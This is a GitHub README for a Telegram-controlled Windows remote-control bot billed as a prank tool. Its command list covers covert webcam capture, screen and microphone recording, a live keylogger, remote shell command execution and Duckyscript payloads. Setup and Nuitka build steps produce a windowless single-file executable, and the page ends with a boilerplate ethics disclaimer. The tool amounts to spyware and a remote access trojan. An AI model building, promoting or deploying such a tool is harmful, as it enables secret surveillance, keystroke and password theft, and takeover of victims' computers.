# RCPepTelegram
Remote Control Bot, inspired to the previous creation named "Peppino", this one offers much many features, including some pretty original pranks.
(only tested on Windows10/11)

```/help: 
🛑 System & Shutdown
shutdown - Shut down the PC.
fakeshutdown - Fake system shutdown.
altf4 - Simulate Alt + F4.
clear - Removes all cv2 windows, closes webcam and removes temporary files.
📸 Camera & Screen
selfie - Take a webcam selfie.
screenshot - Capture screen.
fullclip - Record screen + webcam.
webcamclip - Record webcam.
screenclip - Record screen.
recordjum - Records 20 second clip of jumpscare.
waitforface - Send a webcam photo when face is detected till timeout.
🔊 Audio & Volume
breath - Play breathing sound.
pss - Play "psst" sound.
microphone - Record mic audio.
mute - Set computer's volume to 0.
full - Set computer's volume to 100.
setvolume - Set computer's volume level.
getvolume - Gets the computer's volume level.
tralalerotralala - Plays italian brainrot.
😈 Pranks & Visuals
jumpscare - Show random jumpscare.
jumpscarenoaudio - Jumpscare no audio.
invertedscreen - Shows inverted colors screenshot.
distortedscreen - Shows distorted screenshot.
messagebox - Show a custom message box.
messagespam - Spam message boxes.
camerawallpaper - Sets webcam's frames as wallpaper.
setvideowallpaper - Sets a video as wallpaper.
💻 System Control
execute - Run system command.
processkiller - Shows a table of processes that you can kill.
terminateprocess - Kills a process by name.
randomkeyboard - Sets all user's input to random characters.
capslock - Activates capslock.
mousecontroller - Sends a mouse controlling menu.
📋 Messaging
bsend - Send custom text.
id - Get Owner Chat ID.
quickmenu - Opens a quick menu.
🔒 Can't Open List
cantopenadd - Adds process to cantopenlist.
cantopenremove - Removes process from cantopenlist.
cantopenmenu - Displays processes on cantopenlist, clicking them will remove them.
🧠 Keylogger
keylogger - Records pressed keys on keyboard.
livekeylogger - Sends live updates about what's being typed on the keyboard.
🦑 Misc
plankton - Plankton.
planktonnoaudio - Plankton no audio.
johnpork - John Pork.
johnporknoaudio - John Prok no audio.
gabinetti - Gabinetti nella villa.
duckyscript - Execute duckyscript string.
duckyhelp - Show Duckyscript tutorial.
browser - Open URL in browser.
📎 File Input Commands
*sending a photo* - Displays the photo on the screen as a pop-up.
*sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.
*sending a video with /setvideowallpaper as caption will play it as wallpaper(dont use long videos).
*sending an audio/voice* - Will play the audio/voice in the background.
*sending a file that ends with '.dd' - will execute it as duckyscript. (send /duckyhelp to get commands)
📚 Multi-Command
You can run multiple commands at the same time by sending them in the same message but separated by a comma.
For example this command: "/fullclip 10; /jumpscare" will start the recording, waits 5 seconds, then sends a
jumpscare while recording screen and webcam
```
## Features
- Screen Recording: Record the screen for a specified duration.
- Webcam Recording: Record video from the webcam.
- Keylogging: Log keystrokes and send them to the bot owner.
- Remote Commands: Execute system commands remotely.
- Duckyscript Execution: Execute Duckyscript payloads.
- Audio Recording: Record audio from the microphone.
- Screenshot Capture: Take screenshots of the system.
- Message Boxes: Display custom message boxes on the system.
- System Control: Simulate system shutdowns or other actions.
## Installation
1. Clone the repository

```bash
git clone https://github.com/RiccardoZappitelli/RCPepTelegram

```
2. Install the dependences

```bash
pip install -r requirements.txt

```
## Configuration
Create your own bot with <a href="https://core.telegram.org/bots#botfather">Botfather</a>
Obtain your CHAT ID and BOT TOKEN.
auth.json

```json
{
    "token":"<YOUR TOKEN>",
    "chatid":youchatid
}

```
## BUILD
I used nuitka to build a light executable, only problem I had was including directories in it and I haven't managed to do it yet.

```bash
nuitka pep2.py --windows-console-mode=disable --onefile --follow-imports --msvc=latest

```
## ⚠️ WARNING: Security and Ethical Risks ⚠️
This code is intended for educational purposes only and should not be used in any malicious, unethical, or unauthorized manner. The script contains functionalities that can potentially compromise the security and privacy of a system, including but not limited to:
- Remote Control: The code allows for remote control of a system, including executing commands, capturing screenshots, recording audio/video, and more.
- Keylogging: The script includes keylogging capabilities, which can record keystrokes and send them to a remote user.
- Webcam Access: The script can access and record from the webcam without the user's explicit consent.
- System Manipulation: The script can simulate system shutdowns, open message boxes, and perform other actions that could disrupt normal system operations.
- Duckyscript Execution: The script can execute Duckyscript payloads, which are often used in penetration testing but can also be used maliciously.
## Ethical Considerations
Unauthorized Access: Using this script to access or control a system without the owner's explicit permission is illegal and unethical.
## Privacy Violation: Capturing audio, video, or screenshots without consent is a serious violation of privacy.
Potential for Abuse: This script can be easily modified for malicious purposes, such as spying, data theft, or system disruption.
## Security Risks
- Exposure of Sensitive Data: If the script is not properly secured, sensitive information such as Telegram API tokens, chat IDs, and recorded data could be exposed.
- Remote Exploitation: If the script is deployed in an insecure environment, it could be exploited by attackers to gain unauthorized access to the system.
## Recommendations
- Use Responsibly: Only use this script in environments where you have explicit permission to do so, such as your own systems or systems you are authorized to test.
- Secure Your Environment: Ensure that any API tokens, chat IDs, or other sensitive information are kept secure and not exposed to unauthorized users.
- Legal Compliance: Be aware of and comply with all applicable laws and regulations regarding system access, privacy, and data protection.
- By using this code, you acknowledge and accept full responsibility for any actions taken with it. The author of this code is not responsible for any misuse, damage, or legal consequences that may arise from its use.